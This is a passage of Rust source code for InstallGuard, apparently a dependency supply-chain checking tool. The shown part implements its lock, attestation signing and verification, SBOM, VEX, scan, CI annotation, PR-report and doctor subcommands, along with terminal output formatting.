            results[idx] = SignalSet { signals };
            progress.inc();
        }
    }
    results
}

// ── `schema` subcommand ─────────────────────────────────────────────────────

fn run_schema() -> Result<ExitCode> {
    let schema = Policy::json_schema();
    println!("{}", serde_json::to_string_pretty(&schema)?);
    Ok(ExitCode::SUCCESS)
}

// ── `lock` subcommand ───────────────────────────────────────────────────────

async fn run_lock(args: LockArgs) -> Result<ExitCode> {
    let out = evaluate(&args.common).await?;
    let lock = build_lock(&args.common, &out)?;
    let path = args
        .out
        .unwrap_or_else(|| args.common.path.join("installguard.lock"));
    let json = lock.to_json().context("serialising lock")?;
    std::fs::write(&path, json).with_context(|| format!("writing lock {}", path.display()))?;
    eprintln!(
        "wrote {} ({} packages, digest {}\u{2026})",
        path.display(),
        lock.summary.total,
        lock.digest().get(..12).unwrap_or("")
    );
    Ok(ExitCode::SUCCESS)
}

// ── `attest` subcommand ─────────────────────────────────────────────────────

async fn run_attest(args: AttestArgs) -> Result<ExitCode> {
    let out = evaluate(&args.common).await?;
    let lock = build_lock(&args.common, &out)?;
    let statement = Statement::from_lock(lock);
    let json = if args.pretty {
        statement.to_json().context("serialising statement")?
    } else {
        let mut s = serde_json::to_string(&statement).context("serialising statement")?;
        s.push('\n');
        s
    };

    let dest = args
        .out
        .unwrap_or_else(|| args.common.path.join("installguard.intoto.json"));
    if dest.as_os_str() == "-" {
        print!("{json}");
    } else {
        std::fs::write(&dest, &json)
            .with_context(|| format!("writing statement {}", dest.display()))?;
        eprintln!(
            "wrote {} (predicateType {}, {} packages)",
            dest.display(),
            installguard_core::attestation::PREDICATE_TYPE,
            statement.predicate.summary.total,
        );
    }
    Ok(ExitCode::SUCCESS)
}

// ── `sbom` subcommand ───────────────────────────────────────────────────────

async fn run_sbom(args: SbomArgs) -> Result<ExitCode> {
    use installguard_core::lockfile::sha256_hex;
    use installguard_core::sbom::{Bom, SbomEntry};

    let out = evaluate(&args.common).await?;
    let entries: Vec<SbomEntry<'_>> = out
        .results
        .iter()
        .map(|r| SbomEntry {
            dep: &r.dep,
            decision: &r.decision,
        })
        .collect();
    let bom = Bom::build(
        &entries,
        &sha256_hex(&out.lockfile_bytes),
        chrono::Utc::now(),
        env!("CARGO_PKG_VERSION"),
    );
    let json = bom.to_json().context("serialising sbom")?;

    let dest = args
        .out
        .unwrap_or_else(|| args.common.path.join("installguard.cdx.json"));
    if dest.as_os_str() == "-" {
        print!("{json}");
    } else {
        std::fs::write(&dest, &json).with_context(|| format!("writing sbom {}", dest.display()))?;
        eprintln!(
            "wrote {} (CycloneDX 1.5, {} components)",
            dest.display(),
            bom.components.len(),
        );
    }
    Ok(ExitCode::SUCCESS)
}

// ── `vex` subcommand ────────────────────────────────────────────────────────

async fn run_vex(args: VexArgs) -> Result<ExitCode> {
    use installguard_core::lockfile::sha256_hex;
    use installguard_core::vex::{Vex, VexEntry, DEFAULT_AUTHOR};

    let out = evaluate(&args.common).await?;
    let entries: Vec<VexEntry<'_>> = out
        .results
        .iter()
        .map(|r| VexEntry {
            dep: &r.dep,
            decision: &r.decision,
        })
        .collect();
    let author = args.author.as_deref().unwrap_or(DEFAULT_AUTHOR);
    let vex = Vex::build_with_author(
        &entries,
        &sha256_hex(&out.lockfile_bytes),
        chrono::Utc::now(),
        author,
    );
    let json = vex.to_json().context("serialising vex")?;

    let dest = args
        .out
        .unwrap_or_else(|| args.common.path.join("installguard.vex.json"));
    if dest.as_os_str() == "-" {
        print!("{json}");
    } else {
        std::fs::write(&dest, &json).with_context(|| format!("writing vex {}", dest.display()))?;
        eprintln!(
            "wrote {} (OpenVEX 0.2.0, {} statements)",
            dest.display(),
            vex.statements.len(),
        );
    }
    Ok(ExitCode::SUCCESS)
}

// ── `key` / `sign` subcommands ──────────────────────────────────────────────

fn run_key_generate(priv_out: &std::path::Path, pub_out: &std::path::Path) -> Result<ExitCode> {
    installguard_core::dsse::generate_keypair(priv_out, pub_out).with_context(|| {
        format!(
            "generating keypair {} / {}",
            priv_out.display(),
            pub_out.display()
        )
    })?;
    eprintln!(
        "wrote keypair: {} (private), {} (public)",
        priv_out.display(),
        pub_out.display()
    );
    Ok(ExitCode::SUCCESS)
}

fn run_sign(args: SignArgs) -> Result<ExitCode> {
    use std::io::Read;

    let payload = if args.input.as_os_str() == "-" {
        let mut buf = Vec::new();
        std::io::stdin().read_to_end(&mut buf)?;
        buf
    } else {
        std::fs::read(&args.input).with_context(|| format!("reading {}", args.input.display()))?
    };
    let envelope = installguard_core::dsse::sign(&payload, &args.payload_type, &args.key)
        .with_context(|| format!("signing with {}", args.key.display()))?;
    let mut json = serde_json::to_string_pretty(&envelope).context("serialising envelope")?;
    json.push('\n');

    let dest = args.out.unwrap_or_else(|| {
        let mut p = args.input.clone();
        let ext = p.extension().map_or_else(
            || "sig.json".to_string(),
            |e| format!("{}.sig.json", e.to_string_lossy()),
        );
        p.set_extension(ext);
        p
    });
    if dest.as_os_str() == "-" {
        print!("{json}");
    } else {
        std::fs::write(&dest, &json)
            .with_context(|| format!("writing envelope {}", dest.display()))?;
        eprintln!(
            "wrote {} (DSSE v1, payloadType {}, keyid {}\u{2026})",
            dest.display(),
            envelope.payload_type,
            envelope.signatures[0].keyid.get(..12).unwrap_or(""),
        );
    }
    Ok(ExitCode::SUCCESS)
}

// ── `verify` subcommand ─────────────────────────────────────────────────────
async fn run_verify(args: VerifyArgs) -> Result<ExitCode> {
    if let Some(bundle) = args.bundle.as_ref() {
        return run_verify_bundle(&args, bundle);
    }
    let lock_path = args
        .against
        .clone()
        .unwrap_or_else(|| args.common.path.join("installguard.lock"));
    let prior_raw = std::fs::read_to_string(&lock_path)
        .with_context(|| format!("reading lock {}", lock_path.display()))?;
    let prior = InstallguardLock::from_json(&prior_raw)
        .with_context(|| format!("parsing lock {}", lock_path.display()))?;

    let out = evaluate(&args.common).await?;
    let current = build_lock(&args.common, &out)?;

    match current.verify_against(&prior) {
        Ok(()) => {
            eprintln!(
                "OK  installguard.lock matches ({} packages, digest {}\u{2026})",
                current.summary.total,
                current.digest().get(..12).unwrap_or("")
            );
            Ok(ExitCode::SUCCESS)
        }
        Err(mismatch) => {
            eprintln!("DRIFT installguard.lock does not match:");
            for d in &mismatch.diffs {
                eprintln!("  - {d}");
            }
            Ok(ExitCode::from(1))
        }
    }
}

/// Verify a DSSE-signed in-toto Statement bundle. Checks:
///   1. Signature is valid under `--key`.
///   2. payloadType is the in-toto JSON type cosign uses.
///   3. The wrapped predicate's `lockfile_digest` matches the project's
///      current lockfile bytes (re-hashed) and the predicate's
///      `policy_digest` matches the current policy file. Otherwise the
///      bundle is genuine but no longer current; exit 1.
fn run_verify_bundle(args: &VerifyArgs, bundle_path: &std::path::Path) -> Result<ExitCode> {
    use installguard_core::attestation::{Statement, PREDICATE_TYPE};
    use installguard_core::dsse::{verify, DsseEnvelope, INTOTO_PAYLOAD_TYPE};
    use installguard_core::lockfile::{policy_digest_hex, sha256_hex};

    let key = args.key.as_ref().ok_or_else(|| {
        anyhow::anyhow!("--bundle requires --key (Ed25519 PKCS#8 PEM public key)")
    })?;

    let raw = std::fs::read_to_string(bundle_path)
        .with_context(|| format!("reading bundle {}", bundle_path.display()))?;
    let envelope: DsseEnvelope = serde_json::from_str(&raw).context("parsing DSSE envelope")?;
    let payload = verify(&envelope, key, Some(INTOTO_PAYLOAD_TYPE), None)
        .with_context(|| format!("verifying signature with {}", key.display()))?;

    let statement: Statement =
        serde_json::from_slice(&payload).context("parsing in-toto statement payload")?;
    if statement.predicate_type != PREDICATE_TYPE {
        anyhow::bail!(
            "bundle predicateType {} does not match {PREDICATE_TYPE}",
            statement.predicate_type
        );
    }

    // Cross-check predicate against current project state.
    let lock = &statement.predicate;
    let lockfile_path = args.common.path.join(&lock.lockfile);
    let lockfile_bytes = std::fs::read(&lockfile_path)
        .with_context(|| format!("reading {}", lockfile_path.display()))?;
    let cur_lockfile_digest = sha256_hex(&lockfile_bytes);
    let policy_path = args
        .common
        .policy
        .clone()
        .unwrap_or_else(|| args.common.path.join("installguard.yaml"));
    let policy = if policy_path.exists() {
        installguard_core::policy::Policy::from_path(&policy_path)
            .with_context(|| format!("loading policy {}", policy_path.display()))?
    } else {
        installguard_core::policy::Policy::default()
    };
    let cur_policy_digest = policy_digest_hex(&policy).context("digesting policy")?;

    let mut diffs = Vec::new();
    if cur_lockfile_digest != lock.lockfile_digest {
        diffs.push(format!(
            "lockfile drift: bundle recorded {}, found {}",
            short(&lock.lockfile_digest),
            short(&cur_lockfile_digest)
        ));
    }
    if cur_policy_digest != lock.policy_digest {
        diffs.push(format!(
            "policy drift: bundle recorded {}, found {}",
            short(&lock.policy_digest),
            short(&cur_policy_digest)
        ));
    }

    if diffs.is_empty() {
        eprintln!(
            "OK  bundle signature valid + predicate matches project ({} packages, lockfile {})",
            lock.summary.total,
            short(&lock.lockfile_digest)
        );
        Ok(ExitCode::SUCCESS)
    } else {
        eprintln!("DRIFT bundle is signed and authentic but no longer current:");
        for d in &diffs {
            eprintln!("  - {d}");
        }
        Ok(ExitCode::from(1))
    }
}

fn build_lock(args: &EvalArgs, out: &EvalOutput) -> Result<InstallguardLock> {
    let entries: Vec<LockEntry<'_>> = out
        .results
        .iter()
        .map(|r| LockEntry {
            dep: &r.dep,
            signals: &r.signals,
            decision: &r.decision,
        })
        .collect();
    // Store the lockfile path relative to the project root so the lock is
    // portable across checkout locations.
    let rel_lockfile = out
        .lockfile
        .strip_prefix(&args.path)
        .unwrap_or(&out.lockfile)
        .to_string_lossy()
        .into_owned();
    InstallguardLock::build(
        out.adapter_id,
        &rel_lockfile,
        &out.lockfile_bytes,
        &out.policy,
        &entries,
        chrono::Utc::now(),
        env!("CARGO_PKG_VERSION"),
    )
    .map_err(anyhow::Error::from)
}

// ── `scan` subcommand ───────────────────────────────────────────────────────

async fn run_scan(args: ScanArgs) -> Result<ExitCode> {
    let out = evaluate(&args.common).await?;
    match args.format {
        OutputFormat::Pretty => emit_pretty(&out.results, color_choice()),
        OutputFormat::Human => emit_human(&out.results),
        OutputFormat::Json => {
            let payload = build_json_summary(&out);
            println!("{}", serde_json::to_string_pretty(&payload)?);
        }
    }
    Ok(exit_code(&out.results, None))
}

fn emit_human(results: &[DepResult]) {
    let counts = Counts::from(results);
    for r in results {
        match &r.decision {
            Decision::Allow => {}
            Decision::Warn { reasons } => println!(
                "WARN  {}@{}  {}",
                r.dep.name,
                r.dep.version,
                fmt_reasons(reasons)
            ),
            Decision::Block { reasons } => println!(
                "BLOCK {}@{}  {}",
                r.dep.name,
                r.dep.version,
                fmt_reasons(reasons)
            ),
        }
    }
    println!(
        "\n{} packages: {} allow, {} warn, {} block",
        results.len(),
        counts.allow,
        counts.warn,
        counts.block
    );
}

fn fmt_reasons(reasons: &[Reason]) -> String {
    reasons
        .iter()
        .map(|r| serde_json::to_string(r).unwrap_or_else(|_| "<unencodable>".into()))
        .collect::<Vec<_>>()
        .join(", ")
}

// ── Pretty terminal output ─────────────────────────────────────────────────
//
// Terminal-friendly grouped summary used by `installguard scan` when
// `--format pretty` (the default for TTYs). Reuses the canonical
// `Reason::human_summary()` so the wording stays in sync with PR
// comments and audit-log lines.

#[derive(Debug, Clone, Copy)]
enum ColorChoice {
    Auto,
    Never,
}

impl ColorChoice {
    fn enabled(self) -> bool {
        matches!(self, Self::Auto)
    }
}

/// Honour the conventional `NO_COLOR` env var (https://no-color.org)
/// and disable colour when stdout is not a TTY (e.g. piped to `less`
/// or redirected to a file).
fn color_choice() -> ColorChoice {
    use std::io::IsTerminal;
    if std::env::var_os("NO_COLOR").is_some() {
        return ColorChoice::Never;
    }
    if std::io::stdout().is_terminal() {
        ColorChoice::Auto
    } else {
        ColorChoice::Never
    }
}

const ANSI_RESET: &str = "\x1b[0m";
const ANSI_BOLD: &str = "\x1b[1m";
const ANSI_DIM: &str = "\x1b[2m";
const ANSI_RED: &str = "\x1b[31m";
const ANSI_YELLOW: &str = "\x1b[33m";
const ANSI_GREEN: &str = "\x1b[32m";

fn emit_pretty(results: &[DepResult], color: ColorChoice) {
    use std::io::Write as _;
    let mut stdout = std::io::BufWriter::new(std::io::stdout().lock());
    write_pretty(&mut stdout, results, color).ok();
    stdout.flush().ok();
}

fn write_pretty<W: std::io::Write>(
    out: &mut W,
    results: &[DepResult],
    color: ColorChoice,
) -> std::io::Result<()> {
    let counts = Counts::from(results);
    let (icon, verdict, verdict_colour) = if counts.block > 0 {
        ("✗", "BLOCKED", ANSI_RED)
    } else if counts.warn > 0 {
        ("!", "Warnings", ANSI_YELLOW)
    } else {
        ("✓", "Clean", ANSI_GREEN)
    };

    writeln!(
        out,
        "{} InstallGuard — {}",
        paint(icon, verdict_colour, color),
        paint_bold(verdict, verdict_colour, color),
    )?;
    writeln!(
        out,
        "  {} packages — {} allow · {} warn · {} block",
        results.len(),
        counts.allow,
        paint(&counts.warn.to_string(), ANSI_YELLOW, color),
        paint(&counts.block.to_string(), ANSI_RED, color),
    )?;

    let blocks: Vec<&DepResult> = results
        .iter()
        .filter(|r| matches!(r.decision, Decision::Block { .. }))
        .collect();
    let warns: Vec<&DepResult> = results
        .iter()
        .filter(|r| matches!(r.decision, Decision::Warn { .. }))
        .collect();

    if !blocks.is_empty() {
        writeln!(out)?;
        writeln!(out, "{}", paint_bold("BLOCK", ANSI_RED, color))?;
        for r in &blocks {
            write_pretty_entry(out, r, ANSI_RED, color)?;
        }
    }
    if !warns.is_empty() {
        writeln!(out)?;
        writeln!(out, "{}", paint_bold("WARN", ANSI_YELLOW, color))?;
        for r in &warns {
            write_pretty_entry(out, r, ANSI_YELLOW, color)?;
        }
    }

    if blocks.is_empty() && warns.is_empty() && !results.is_empty() {
        writeln!(out)?;
        writeln!(
            out,
            "  {}",
            paint(
                &format!("All {} dependencies passed policy.", results.len()),
                ANSI_DIM,
                color,
            )
        )?;
    }

    if !blocks.is_empty() || !warns.is_empty() {
        write_pretty_footer(out, &blocks, color)?;
    }
    Ok(())
}

/// Universal next-steps footer rendered after the per-package list.
/// Stays generic (the per-reason `\u{21b3}` hints carry the
/// signal-specific advice) and points the operator at the four
/// most common follow-ups: investigate, allowlist, freeze, report.
fn write_pretty_footer<W: std::io::Write>(
    out: &mut W,
    blocks: &[&DepResult],
    color: ColorChoice,
) -> std::io::Result<()> {
    writeln!(out)?;
    writeln!(out, "{}", paint_bold("Next steps", ANSI_BOLD, color))?;
    if let Some(first) = blocks.first() {
        let url = format!(
            "https://www.npmjs.com/package/{}/v/{}",
            first.dep.name, first.dep.version
        );
        writeln!(
            out,
            "  \u{2022} Investigate the package on its registry page (e.g. {})",
            paint(&url, ANSI_DIM, color)
        )?;
    } else {
        writeln!(
            out,
            "  \u{2022} Investigate each finding on its registry page"
        )?;
    }
    writeln!(
        out,
        "  \u{2022} If intentional, allowlist in {} (see `installguard schema`)",
        paint("installguard.yaml", ANSI_DIM, color),
    )?;
    writeln!(
        out,
        "  \u{2022} Once green, freeze decisions with {} for reproducible CI",
        paint("`installguard lock`", ANSI_DIM, color),
    )?;
    writeln!(
        out,
        "  \u{2022} If you believe this is a real attack, report to {}",
        paint("https://github.com/advisories/new", ANSI_DIM, color),
    )?;
    Ok(())
}

fn write_pretty_entry<W: std::io::Write>(
    out: &mut W,
    r: &DepResult,
    accent: &str,
    color: ColorChoice,
) -> std::io::Result<()> {
    let reasons = match &r.decision {
        Decision::Block { reasons } | Decision::Warn { reasons } => reasons.as_slice(),
        Decision::Allow => &[],
    };
    let header = format!("{}@{}", r.dep.name, r.dep.version);
    writeln!(out, "  {}", paint_bold(&header, accent, color))?;
    for reason in reasons {
        writeln!(out, "    • {}", reason.human_summary())?;
        if let Some(hint) = reason.remediation() {
            writeln!(
                out,
                "      {}",
                paint(&format!("\u{21b3} {hint}"), ANSI_DIM, color)
            )?;
        }
    }
    Ok(())
}

fn paint(s: &str, code: &str, color: ColorChoice) -> String {
    if color.enabled() {
        format!("{code}{s}{ANSI_RESET}")
    } else {
        s.to_string()
    }
}

fn paint_bold(s: &str, code: &str, color: ColorChoice) -> String {
    if color.enabled() {
        format!("{ANSI_BOLD}{code}{s}{ANSI_RESET}")
    } else {
        s.to_string()
    }
}

// ── `ci` subcommand ─────────────────────────────────────────────────────────

async fn run_ci(args: CiArgs) -> Result<ExitCode> {
    let out = evaluate(&args.common).await?;
    let counts = Counts::from(out.results.as_slice());
    let github = args.github || std::env::var("GITHUB_ACTIONS").as_deref() == Ok("true");

    if github {
        emit_github_annotations(&out);
    }

    let summary = build_json_summary(&out);
    let pretty = serde_json::to_string_pretty(&summary)?;
    println!("{pretty}");

    if let Some(path) = &args.summary_file {
        let mut f = std::fs::File::create(path)
            .with_context(|| format!("creating summary file {}", path.display()))?;
        f.write_all(pretty.as_bytes())?;
        f.write_all(b"\n")?;
        tracing::info!(path = %path.display(), "wrote summary file");
    }

    // Compact one-line summary on stderr so it shows up in CI logs even when
    // stdout is captured into a file.
    eprintln!(
        "installguard: {} packages — {} allow, {} warn, {} block",
        out.results.len(),
        counts.allow,
        counts.warn,
        counts.block
    );

    Ok(exit_code(&out.results, args.max_warn))
}

fn emit_github_annotations(out: &EvalOutput) {
    let file = out.lockfile.display().to_string();
    for r in &out.results {
        let (level, reasons) = match &r.decision {
            Decision::Allow => continue,
            Decision::Warn { reasons } => ("warning", reasons),
            Decision::Block { reasons } => ("error", reasons),
        };
        let msg = format!("{}@{}: {}", r.dep.name, r.dep.version, fmt_reasons(reasons));
        let title = format!("InstallGuard {level}");
        // Workflow command syntax: `::cmd key=val,key=val::data`. Properties
        // and data have different escaping rules — see GitHub docs.
        println!(
            "::{level} file={f},title={t}::{m}",
            f = escape_workflow_property(&file),
            t = escape_workflow_property(&title),
            m = escape_workflow_data(&msg)
        );
    }
}

fn escape_workflow_property(s: &str) -> String {
    s.replace('%', "%25")
        .replace('\r', "%0D")
        .replace('\n', "%0A")
        .replace(':', "%3A")
        .replace(',', "%2C")
}

fn escape_workflow_data(s: &str) -> String {
    s.replace('%', "%25")
        .replace('\r', "%0D")
        .replace('\n', "%0A")
}

// ── Shared output helpers ───────────────────────────────────────────────────

#[derive(Debug, Default, Clone, Copy)]
struct Counts {
    allow: usize,
    warn: usize,
    block: usize,
}

impl From<&[DepResult]> for Counts {
    fn from(results: &[DepResult]) -> Self {
        let mut c = Counts::default();
        for r in results {
            match &r.decision {
                Decision::Allow => c.allow += 1,
                Decision::Warn { .. } => c.warn += 1,
                Decision::Block { .. } => c.block += 1,
            }
        }
        c
    }
}

fn exit_code(results: &[DepResult], max_warn: Option<usize>) -> ExitCode {
    let counts = Counts::from(results);
    if counts.block > 0 {
        return ExitCode::from(1);
    }
    if let Some(limit) = max_warn {
        if counts.warn > limit {
            return ExitCode::from(1);
        }
    }
    ExitCode::SUCCESS
}

fn build_json_summary(out: &EvalOutput) -> serde_json::Value {
    let counts = Counts::from(out.results.as_slice());
    serde_json::json!({
        "schemaVersion": 1,
        "tool": { "name": "installguard", "version": env!("CARGO_PKG_VERSION") },
        "evaluatedAt": chrono::Utc::now(),
        "lockfile": out.lockfile.display().to_string(),
        "adapter": out.adapter_id,
        "summary": {
            "total": out.results.len(),
            "allow": counts.allow,
            "warn":  counts.warn,
            "block": counts.block,
        },
        "decisions": out.results.iter().map(|r| serde_json::json!({
            "name": r.dep.name,
            "version": r.dep.version,
            "direct": r.dep.direct,
            "decision": r.decision.label(),
            "details": r.decision,
            "signals": r.signals.signals,
        })).collect::<Vec<_>>(),
    })
}

// ── `report` subcommand ─────────────────────────────────────────────────────
//
// Renders a previously-emitted `ci --summary-file` JSON document as a
// Markdown sticky-comment body suitable for posting to a PR/MR. This is the
// single source of truth for InstallGuard's PR-comment renderer; the GitHub
// Action and the GitLab CI template both shell out to it. Keeping the
// renderer in Rust (and unit-tested) avoids duplicated and out-of-date
// JS/Python implementations that miss new `Reason` variants.

const STICKY_MARKER: &str = "<!-- installguard-summary -->";

fn run_report(args: ReportArgs) -> Result<ExitCode> {
    let ReportArgs {
        from,
        format,
        max_rows,
        commit,
        exit_code,
        out,
    } = args;
    let raw = if from == PathBuf::from("-") {
        let mut buf = String::new();
        std::io::stdin().read_to_string(&mut buf)?;
        buf
    } else {
        std::fs::read_to_string(&from)
            .with_context(|| format!("reading summary from {}", from.display()))?
    };
    let value: serde_json::Value = serde_json::from_str(&raw).context("parsing summary JSON")?;
    let body = match format {
        ReportFormat::Markdown => render_markdown(&value, max_rows, commit.as_deref(), exit_code),
    };
    if let Some(path) = out {
        std::fs::write(&path, &body)
            .with_context(|| format!("writing report to {}", path.display()))?;
    } else {
        print!("{body}");
    }
    Ok(ExitCode::SUCCESS)
}

fn render_markdown(
    summary_doc: &serde_json::Value,
    max_rows: usize,
    commit: Option<&str>,
    exit_code: Option<i32>,
) -> String {
    use std::fmt::Write as _;
    let summary = summary_doc.get("summary");
    let total = summary
        .and_then(|s| s.get("total"))
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(0);
    let allow = summary
        .and_then(|s| s.get("allow"))
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(0);
    let warn = summary
        .and_then(|s| s.get("warn"))
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(0);
    let block = summary
        .and_then(|s| s.get("block"))
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(0);

    // Use literal Unicode rather than `:no_entry:` shortcodes so the body
    // renders identically on GitHub, GitLab, Gitea, Forgejo, and any other
    // GFM consumer.
    let (icon, verdict) = if block > 0 {
        ("🚫", "BLOCKED")
    } else if warn > 0 {
        ("⚠️", "Warnings")
    } else {
        ("✅", "Clean")
    };

    let mut out = String::with_capacity(1024);
    out.push_str(STICKY_MARKER);
    out.push('\n');
    let _ = writeln!(out, "## {icon} InstallGuard — {verdict}\n");
    out.push_str("| Total | Allow | Warn | Block |\n|---:|---:|---:|---:|\n");
    let _ = writeln!(out, "| {total} | {allow} | {warn} | **{block}** |\n");

    let empty = Vec::new();
    let decisions = summary_doc
        .get("decisions")
        .and_then(serde_json::Value::as_array)
        .unwrap_or(&empty);
    let flagged: Vec<&serde_json::Value> = decisions
        .iter()
        .filter(|d| d.get("decision").and_then(serde_json::Value::as_str) != Some("allow"))
        .collect();

    if flagged.is_empty() {
        let _ = writeln!(out, "_All {total} dependencies passed policy._");
    } else {
        out.push_str("### Flagged packages\n\n| Decision | Package | Reason |\n|---|---|---|\n");
        for d in flagged.iter().take(max_rows) {
            let name = d
                .get("name")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("?");
            let version = d
                .get("version")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("?");
            let decision = d
                .get("decision")
                .and_then(serde_json::Value::as_str)
                .unwrap_or("?")
                .to_uppercase();
            let reason_text = render_reasons_cell(d);
            let _ = writeln!(out, "| {decision} | `{name}@{version}` | {reason_text} |");
        }
        if flagged.len() > max_rows {
            let _ = writeln!(
                out,
                "\n_…and {} more (truncated)._",
                flagged.len() - max_rows
            );
        }
    }

    let schema = summary_doc
        .get("schemaVersion")
        .and_then(serde_json::Value::as_u64)
        .unwrap_or(1);
    out.push_str("\n<sub>schema v");
    out.push_str(&schema.to_string());
    if let Some(rc) = exit_code {
        let _ = write!(out, " · exit {rc}");
    }
    if let Some(sha) = commit {
        // Trim to short SHA when a full one is supplied; pass through anything else.
        let short = if sha.len() >= 7 && sha.bytes().all(|b| b.is_ascii_hexdigit()) {
            &sha[..7]
        } else {
            sha
        };
        let _ = write!(out, " · commit {short}");
    }
    out.push_str("</sub>\n");
    out
}

/// Render the `reasons` array of a single decision into one cell of the
/// markdown table. Each reason is decoded via the canonical
/// `Reason::human_summary()` so PR comments stay in sync with VEX
/// statements and audit-log lines without per-surface `match` arms.
/// Reasons that fail to decode (e.g. a future variant emitted by a
/// newer InstallGuard) fall back to their stable `code` tag so the
/// renderer never panics on forward-incompatible input.
fn render_reasons_cell(decision: &serde_json::Value) -> String {
    let Some(reasons) = decision
        .get("details")
        .and_then(|d| d.get("reasons"))
        .and_then(serde_json::Value::as_array)
    else {
        return "(no reason)".to_string();
    };
    if reasons.is_empty() {
        return "(no reason)".to_string();
    }
    reasons
        .iter()
        .map(|r| {
            if let Ok(decoded) = serde_json::from_value::<Reason>(r.clone()) {
                escape_table_cell(&decoded.human_summary())
            } else {
                // Forward-compat: unknown variant — surface its `code` tag.
                let code = r
                    .get("code")
                    .and_then(serde_json::Value::as_str)
                    .unwrap_or("unknown");
                format!("`{code}`")
            }
        })
        .collect::<Vec<_>>()
        .join("; ")
}

/// Markdown table cells must not contain raw `|` or newlines — escape both.
fn escape_table_cell(s: &str) -> String {
    s.replace('|', "\\|").replace('\n', " ")
}

// ── `doctor` subcommand ─────────────────────────────────────────────────────

/// Triage findings into operator-actionable buckets and print a
/// suggested `installguard.yaml` snippet that resolves the false
/// positives we have a known fix for.
async fn run_doctor(args: DoctorArgs) -> Result<ExitCode> {
    let output = evaluate(&args.common).await?;
    let suggestion = build_doctor_suggestion(&output.results);
    print_doctor_report(&output, &suggestion);
    // Doctor is advisory — never fail the shell. Use scan/ci to gate.
    Ok(ExitCode::SUCCESS)
}

#[derive(Debug, Default)]
struct DoctorSuggestion {
    /// Packages with at least one `DisallowedLifecycleScript` reason.
    /// (name, sorted unique list of scripts seen across all reasons).
    lifecycle_scripts: Vec<(String, Vec<String>)>,
    /// Packages flagged `NameSquat` — operator must verify these are
    /// legitimate before adding to the allowlist.
    name_squats: Vec<(String, String)>,
    /// True iff at least one block was a `DistTagAnomaly`. The default
    /// severity is already `warn` since 0.1.6, so this only triggers
    /// when the operator promoted it.
    dist_tag_block_seen: bool,
    /// True iff at least one block was a `SignalUnavailable`. Same
    /// shape as above — default is `warn` since 0.1.7.
    signal_unavailable_block_seen: bool,
    /// Total counts for the header, regardless of whether they were
    /// actionable.
    total_packages: usize,
    total_blocks: usize,
    total_warns: usize,
}

fn build_doctor_suggestion(results: &[DepResult]) -> DoctorSuggestion {
    use std::collections::BTreeMap;

    let mut s = DoctorSuggestion {
        total_packages: results.len(),
        ..DoctorSuggestion::default()
    };

    // Walk only blocked deps for actionable buckets; warns are counted
    // for the header but not surfaced as fixes (they don't gate CI).
    let mut scripts_by_pkg: BTreeMap<String, std::collections::BTreeSet<String>> = BTreeMap::new();
    let mut squats: BTreeMap<String, String> = BTreeMap::new();

    for r in results {
        match &r.decision {
            Decision::Block { reasons } => {
                s.total_blocks += 1;
                for reason in reasons {
                    match reason {
                        Reason::DisallowedLifecycleScript { script } => {
                            scripts_by_pkg
                                .entry(r.dep.name.clone())
                                .or_default()
                                .insert(script.clone());
                        }
                        Reason::NameSquat { target, .. } => {
                            squats.insert(r.dep.name.clone(), target.clone());
                        }
                        Reason::DistTagAnomaly { .. } => s.dist_tag_block_seen = true,
                        Reason::SignalUnavailable { .. } => {
                            s.signal_unavailable_block_seen = true;
                        }
                        _ => {}
                    }
                }
            }
            Decision::Warn { .. } => s.total_warns += 1,
            Decision::Allow => {}
        }
    }

    s.lifecycle_scripts = scripts_by_pkg
        .into_iter()
        .map(|(k, v)| (k, v.into_iter().collect()))
        .collect();
    s.name_squats = squats.into_iter().collect();
    s
}

fn print_doctor_report(output: &EvalOutput, s: &DoctorSuggestion) {
    use std::io::Write;
    let mut stdout = std::io::stdout().lock();

    let _ = writeln!(stdout, "InstallGuard doctor — {}", output.adapter_id);
    let _ = writeln!(
        stdout,
        "  {} packages — {} block · {} warn",
        s.total_packages, s.total_blocks, s.total_warns
    );
    let _ = writeln!(stdout);

    let actionable = !s.lifecycle_scripts.is_empty()
        || !s.name_squats.is_empty()
        || s.dist_tag_block_seen
        || s.signal_unavailable_block_seen;

    if !actionable {
        if s.total_blocks == 0 {
            let _ = writeln!(stdout, "No blocks. Nothing to suggest.");
        } else {
            let _ = writeln!(
                stdout,
                "{} block(s) found, but none are in classes doctor knows how to suggest a config for.",
                s.total_blocks
            );
            let _ = writeln!(
                stdout,
                "Run `installguard scan` for the full list and triage manually."
            );
        }
        return;
    }

    // Commentary — explain *why* each suggestion is being made.
    if !s.lifecycle_scripts.is_empty() {
        let _ = writeln!(
            stdout,
            "Lifecycle scripts ({} package{}):",
            s.lifecycle_scripts.len(),
            if s.lifecycle_scripts.len() == 1 {
                ""
            } else {
                "s"
            }
        );
        for (name, scripts) in &s.lifecycle_scripts {
            let _ = writeln!(stdout, "  • {} ({})", name, scripts.join(", "));
        }
        let _ = writeln!(
            stdout,
            "  Review each package's install script before allowing — see"
        );
        let _ = writeln!(
            stdout,
            "  https://www.npmjs.com/package/<name> and the package's source."
        );
        let _ = writeln!(stdout);
    }

    if !s.name_squats.is_empty() {
        let _ = writeln!(
            stdout,
            "Name-squat allowlist candidates ({}):",
            s.name_squats.len()
        );
        for (name, target) in &s.name_squats {
            let _ = writeln!(stdout, "  • {name} (resembles `{target}`)");
        }
        let _ = writeln!(
            stdout,
            "  Add ONLY if you've confirmed each package is the legitimate one"
        );
        let _ = writeln!(
            stdout,
            "  you intended (e.g. `gaxios` is Google's official HTTP client)."
        );
        let _ = writeln!(stdout);
    }

    if s.dist_tag_block_seen {
        let _ = writeln!(stdout, "Severity: dist-tag-anomaly is currently blocking.");
        let _ = writeln!(
            stdout,
            "  Default since 0.1.6 is `warn` — likely a local promotion."
        );
        let _ = writeln!(stdout);
    }
    if s.signal_unavailable_block_seen {
        let _ = writeln!(
            stdout,
            "Severity: signal-unavailable is currently blocking."
        );
        let _ = writeln!(
            stdout,
            "  Default since 0.1.7 is `warn` — likely a local promotion."
        );
        let _ = writeln!(stdout);
    }

    // The paste-ready YAML.
    let _ = writeln!(stdout, "Suggested installguard.yaml additions:");
    let _ = writeln!(stdout, "─────────────────────────────────────────");
    let _ = writeln!(stdout, "{}", render_doctor_yaml(s));
}

